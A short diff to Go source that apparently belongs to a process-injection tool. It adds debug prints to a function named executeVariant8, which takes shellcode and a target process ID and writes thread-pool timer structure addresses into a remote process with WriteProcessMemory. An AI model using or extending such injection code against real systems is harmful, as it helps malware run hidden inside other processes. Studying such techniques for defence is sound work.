@@ -1011,6 +1011,11 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
 	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
 
+	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
+	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)
+
 	// Write WindowStartLinks address to WindowStart.Root
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
